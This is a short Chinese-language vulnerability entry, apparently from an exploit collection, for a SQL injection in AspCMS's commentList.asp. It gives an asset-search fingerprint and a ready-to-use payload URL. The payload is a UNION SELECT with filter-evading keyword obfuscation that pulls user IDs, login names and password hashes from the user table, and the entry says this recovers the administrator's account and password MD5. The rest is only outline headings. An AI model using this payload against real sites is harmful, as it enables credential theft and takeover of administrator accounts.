# AspCMScommentList.aspSQL注入漏洞

- **系统**：AspCMScommentList　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="AspCMS"`

**请求体 / payload**
```
/plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user
成功获取管理员账号以及密码的MD5\
```

**其他**
- AspCMS commentList.asp SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * AspCMS